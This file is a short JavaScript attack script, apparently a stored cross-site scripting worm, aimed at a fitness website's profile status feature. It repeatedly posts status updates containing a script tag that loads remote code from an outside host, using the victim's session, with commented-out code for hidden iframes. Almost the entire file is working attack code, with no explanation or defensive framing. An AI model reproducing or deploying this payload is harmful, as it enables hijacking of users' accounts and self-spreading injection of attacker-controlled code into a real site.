debug("begin fit_status");

function remove(id) { var e = document.getElementById(id);
if (e && e.parentNode) { console.log("remove: " + id); e.parentNode.removeChild(elem); } else { console.log("can't find: " + id); } }

// setup the session to recieve a fit status post
/* 
$('<iframe>')
  .css({
 position: 'absolute',
 width: '0',
 height: '0',
 background: '#fff',
 name: 'mypage',
 id: 'mypage'
 }).attr('src', "http://my.bodybuilding.com/community/my-bodyspace/").appendTo('body');
console.log("my prepped");
window.setTimeout(function() { remove("mypage"); console.log("my prep removed"); }, 50);
*/

var url1 = "//my.bodybuilding.com/community/my-bodyspace/?";
//debug(url1);
var url2 = "-1.IBehaviorListener.0-superbox-fitStatusForm-saveFitStatus";
//debug(url2);



var xssn=1;
setTimeout(function() { xsscop(url1+xssn+url2, {saveFitStatus:"1", fitStatusText:"<script src='//infosec3/h.php'></script>I love Mondays"}, "mypage");xssn++; },100);
setTimeout(function() { xsscop(url1+xssn+url2, {saveFitStatus:"1", fitStatusText:"<script src='//infosec3/h.php'></script>I love Mondays"}, "mypage");xssn++; },1000);
setTimeout(function() { xsscop(url1+xssn+url2, {saveFitStatus:"1", fitStatusText:"<script src='//infosec3/h.php'></script>I love Mondays"}, "mypage");xssn++; },2000);
setTimeout(function() { xsscop(url1+xssn+url2, {saveFitStatus:"1", fitStatusText:"<script src='//infosec3/h.php'></script>I love Mondays"});xssn++; },3000);
setTimeout(function() { xsscop(url1+xssn+url2, {saveFitStatus:"1", fitStatusText:"<script src='//infosec3/h.php'></script>I love Mondays"});xssn++; },4000);
setTimeout(function() { xsscop(url1+xssn+url2, {saveFitStatus:"1", fitStatusText:"<script src='//infosec3/h.php'></script>I love Mondays"});xssn++; },5000);
setTimeout(function() { xsscop(url1+xssn+url2, {saveFitStatus:"1", fitStatusText:"<script src='//infosec3/h.php'></script>I love Mondays"});xssn++; },6000);
setTimeout(function() { xsscop(url1+xssn+url2, {saveFitStatus:"1", fitStatusText:"<script src='//infosec3/h.php'></script>I love Mondays"});xssn++; },7000);


/*
function sprayFrames() {
	for (var i = n; i<n+5; i++) {
		console.log("inject iframe: " + i);
	}
	debug("3 iframes injected");
}

sprayFrames();
*/
debug("spraying iframes");
